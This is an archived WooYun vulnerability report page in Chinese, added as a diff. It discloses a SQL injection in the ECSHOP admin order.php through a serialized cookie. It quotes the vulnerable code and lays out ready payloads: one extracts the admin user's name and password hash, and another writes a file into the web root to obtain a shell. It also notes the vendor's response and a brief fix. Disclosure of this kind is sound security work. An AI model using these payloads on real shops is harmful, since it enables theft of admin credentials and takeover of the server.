@@ -1,0 +1,266 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		ECSHOP后台低权限sql注入  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		ECSHOP后台低权限sql注入  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/酱油甲">酱油甲</a> 
+</li><li>提交时间：		2013-12-19 15:00</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-19：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-12-19：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-12-29：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-01-08：	细节向普通白帽子公开<br/>
+									2014-01-18：	细节向实习白帽子公开<br/>
+									2014-02-02：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">ECSHOP后台低权限sql注入一枚</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">普通发货员在登陆之后只需要一个订单列表的权限（也就是低权限管理员即可）就可以注入得到超管权限<br />
+<br />
+如有文件权限还可以getshell<br />
+<br />
+<br />
+<br />
+问题出在/admin/order.php中<br />
+<br />
+</p><pre><code>if (!empty($_COOKIE[&#039;ECSCP&#039;][&#039;lastfilter&#039;]))<br />
+    {<br />
+        $filter = unserialize(urldecode($_COOKIE[&#039;ECSCP&#039;][&#039;lastfilter&#039;]));///// //这里urldecode了$_COOKIE[&#039;ECSCP&#039;][&#039;lastfilter&#039;]，可怜的GPC~~唉……<br />
+        if (!empty($filter[&#039;composite_status&#039;]))<br />
+        {<br />
+            $where = &#039;&#039;;<br />
+            //综合状态<br />
+            switch($filter[&#039;composite_status&#039;])<br />
+            {<br />
+                case CS_AWAIT_PAY :<br />
+                    $where .= order_query_sql(&#039;await_pay&#039;);<br />
+                    break;<br />
+<br />
+<br />
+                case CS_AWAIT_SHIP :<br />
+                    $where .= order_query_sql(&#039;await_ship&#039;);<br />
+                    break;<br />
+<br />
+<br />
+                case CS_FINISHED :<br />
+                    $where .= order_query_sql(&#039;finished&#039;);<br />
+                    break;<br />
+<br />
+<br />
+                default:<br />
+                    if ($filter[&#039;composite_status&#039;] != -1)<br />
+                    {<br />
+                        $where .= &quot; AND o.order_status = &#039;$filter[composite_status]&#039; &quot;;     //这里将composite_status直接带入了sql<br />
+                    }<br />
+            }<br />
+        }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+------详细过程------------------------------------------<br />
+<br />
+1.点击订单列表：<br />
+<br />
+</p><p class="detail"><a href="../images/191409366c07d84ec02a0b9b124ddd77fe9f160d.jpg" target="_blank"><img src="../images/191409366c07d84ec02a0b9b124ddd77fe9f160d.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+2.点击后会set三个cookie，修改ECSCP[lastfilter]为（其实就是改composite_status）：<br />
+<br />
+</p><p class="detail"><a href="../images/1914095777d967829415683f572a675cc52c2968.jpg" target="_blank"><img src="../images/1914095777d967829415683f572a675cc52c2968.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+修改ECSCP[lastfilter]为（其实就是改composite_status）：<br />
+<br />
+a%253A28%253A%257Bs%253A8%253A%2522order_sn%2522%253Bs%253A0%253A%2522%2522%253Bs%253A9%253A%2522consignee%2522%253Bs%253A0%253A%2522%2522%253Bs%253A5%253A%2522email%2522%253Bs%253A0%253A%2522%2522%253Bs%253A7%253A%2522address%2522%253Bs%253A0%253A%2522%2522%253Bs%253A7%253A%2522zipcode%2522%253Bs%253A0%253A%2522%2522%253Bs%253A3%253A%2522tel%2522%253Bs%253A0%253A%2522%2522%253Bs%253A6%253A%2522mobile%2522%253Bi%253A0%253Bs%253A7%253A%2522country%2522%253Bi%253A0%253Bs%253A8%253A%2522province%2522%253Bi%253A0%253Bs%253A4%253A%2522city%2522%253Bi%253A0%253Bs%253A8%253A%2522district%2522%253Bi%253A0%253Bs%253A11%253A%2522shipping_id%2522%253Bi%253A0%253Bs%253A6%253A%2522pay_id%2522%253Bi%253A0%253Bs%253A12%253A%2522order_status%2522%253Bi%253A-1%253Bs%253A15%253A%2522shipping_status%2522%253Bi%253A-1%253Bs%253A10%253A%2522pay_status%2522%253Bi%253A-1%253Bs%253A7%253A%2522user_id%2522%253Bi%253A0%253Bs%253A9%253A%2522user_name%2522%253Bs%253A0%253A%2522%2522%253Bs%253A16%253A%2522composite_status%2522%253Bi%253A-1%253Bs%253A12%253A%2522group_buy_id%2522%253Bi%253A0%253Bs%253A7%253A%2522sort_by%2522%253Bs%253A8%253A%2522add_time%2522%253Bs%253A10%253A%2522sort_order%2522%253Bs%253A4%253A%2522DESC%2522%253Bs%253A10%253A%2522start_time%2522%253Bs%253A0%253A%2522%2522%253Bs%253A8%253A%2522end_time%2522%253Bs%253A0%253A%2522%2522%253Bs%253A4%253A%2522page%2522%253Bi%253A1%253Bs%253A9%253A%2522page_size%2522%253Bi%253A15%253Bs%253A12%253A%2522record_count%2522%253Bs%253A2%253A%252219%2522%253Bs%253A10%253A%2522page_count%2522%253Bd%253A2%253B%257D<br />
+<br />
+<br />
+<br />
+也就是<br />
+<br />
+a:28:{s:8:&quot;order_sn&quot;;s:0:&quot;&quot;;s:9:&quot;consignee&quot;;s:0:&quot;&quot;;s:5:&quot;email&quot;;s:0:&quot;&quot;;s:7:&quot;address&quot;;s:0:&quot;&quot;;s:7:&quot;zipcode&quot;;s:0:&quot;&quot;;s:3:&quot;tel&quot;;s:0:&quot;&quot;;s:6:&quot;mobile&quot;;i:0;s:7:&quot;country&quot;;i:0;s:8:&quot;province&quot;;i:0;s:4:&quot;city&quot;;i:0;s:8:&quot;district&quot;;i:0;s:11:&quot;shipping_id&quot;;i:0;s:6:&quot;pay_id&quot;;i:0;s:12:&quot;order_status&quot;;i:-1;s:15:&quot;shipping_status&quot;;i:-1;s:10:&quot;pay_status&quot;;i:-1;s:7:&quot;user_id&quot;;i:0;s:9:&quot;user_name&quot;;s:3:&quot;333&quot;;s:16:&quot;composite_status&quot;;s:200:&quot;1&#039; and (select 1 from(select count(*),concat((Select concat(0x5b,user_name,0x3a,password,0x5d) FROM ecs_admin_user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and &#039;1&#039;=&#039;1&quot;;s:12:&quot;group_buy_id&quot;;i:0;s:7:&quot;sort_by&quot;;s:8:&quot;add_time&quot;;s:10:&quot;sort_order&quot;;s:4:&quot;DESC&quot;;s:10:&quot;start_time&quot;;s:0:&quot;&quot;;s:8:&quot;end_time&quot;;s:0:&quot;&quot;;s:4:&quot;page&quot;;i:1;s:9:&quot;page_size&quot;;i:15;s:12:&quot;record_count&quot;;s:2:&quot;19&quot;;s:10:&quot;page_count&quot;;d:2;}<br />
+<br />
+<br />
+<br />
+3.然后随意访问一个order，比如：<br />
+<br />
+http://localhost/ecshop273/admin/order.php?act=info&amp;order_id=19<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/19141021502d3b1e1310d8ba4c0b433c0cd9614b.jpg" target="_blank"><img src="../images/19141021502d3b1e1310d8ba4c0b433c0cd9614b.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+即可达到注入的目的<br />
+<br />
+<br />
+<br />
+4.如上图中，此处注入同时可以爆出路径，因此，当拥有写权限的时候<br />
+<br />
+将cookie改为：<br />
+<br />
+a:28:{s:8:&quot;order_sn&quot;;s:0:&quot;&quot;;s:9:&quot;consignee&quot;;s:0:&quot;&quot;;s:5:&quot;email&quot;;s:0:&quot;&quot;;s:7:&quot;address&quot;;s:0:&quot;&quot;;s:7:&quot;zipcode&quot;;s:0:&quot;&quot;;s:3:&quot;tel&quot;;s:0:&quot;&quot;;s:6:&quot;mobile&quot;;i:0;s:7:&quot;country&quot;;i:0;s:8:&quot;province&quot;;i:0;s:4:&quot;city&quot;;i:0;s:8:&quot;district&quot;;i:0;s:11:&quot;shipping_id&quot;;i:0;s:6:&quot;pay_id&quot;;i:0;s:12:&quot;order_status&quot;;i:-1;s:15:&quot;shipping_status&quot;;i:-1;s:10:&quot;pay_status&quot;;i:-1;s:7:&quot;user_id&quot;;i:0;s:9:&quot;user_name&quot;;s:3:&quot;333&quot;;s:16:&quot;composite_status&quot;;s:72:&quot;1&#039; union select 1 into outfile &#039;F:/wamp/www/ECShop273/includes/1.txt&#039;#--&quot;;s:12:&quot;group_buy_id&quot;;i:0;s:7:&quot;sort_by&quot;;s:8:&quot;add_time&quot;;s:10:&quot;sort_order&quot;;s:4:&quot;DESC&quot;;s:10:&quot;start_time&quot;;s:0:&quot;&quot;;s:8:&quot;end_time&quot;;s:0:&quot;&quot;;s:4:&quot;page&quot;;i:1;s:9:&quot;page_size&quot;;i:15;s:12:&quot;record_count&quot;;s:2:&quot;19&quot;;s:10:&quot;page_count&quot;;d:2;}<br />
+<br />
+将上面代码经过---“两次urlencode”---，然后放到cookie的ECSCP[lastfilter]中<br />
+<br />
+再访问任意一个ORDER，好的~~shell躺着了~~<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1914111688129c2ea42ef870a13d9cba480de99a.jpg" target="_blank"><img src="../images/1914111688129c2ea42ef870a13d9cba480de99a.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">都在上面 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">urldecode之后再次过滤 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/酱油甲" title="酱油甲">酱油甲</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-046448" title="ECSHOP后台低权限sql注入">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：3 </p>
+													<p class="detail">确认时间：2013-12-19 17:45</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您为shopex信息安全做的贡献<br />
+我们将尽快修复<br />
+非常感谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="46448";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
